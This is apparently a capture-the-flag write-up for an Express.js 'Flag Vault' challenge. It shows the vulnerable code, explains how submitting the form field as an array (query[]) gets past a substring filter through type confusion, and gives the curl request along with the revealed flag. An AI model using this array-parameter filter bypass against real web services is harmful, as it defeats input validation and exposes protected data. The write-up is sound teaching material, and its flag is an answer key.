A simple Express.js app serves a “Flag Vault” page where users submit a key via a POST `/search`. If the key matches a hardcoded `key` string, a flag is revealed. However, there's a rudimentary filter that blocks any input containing the substring `"String"`.

Rough code flow:

```js
const key = "randomBytes(16).toString('hex')";
const query = req.body.query;

if (query.includes("String")) {
  return res.send("❌ Access Denied");
}
if (query.includes(key)) {
  return res.send("✅ Key matched: … Here is your flag");
}
```

- The bodyParser. urlencoded({ extended: true }) setting allows for arrays in the form input (query[]=), not just strings.
- That means if req. body. query is an array, it won't be blocked unless there's an element equal to "String".

```bash
curl -X POST \
  --data-urlencode "query[]=randomBytes(16).toString('hex')" \
  http://<IP>:<PORT>/search
prelim{i_was_confused_ab_what_to_make--so_i_made_a_js_type_confusion_baby_challenge_ehhe}
```
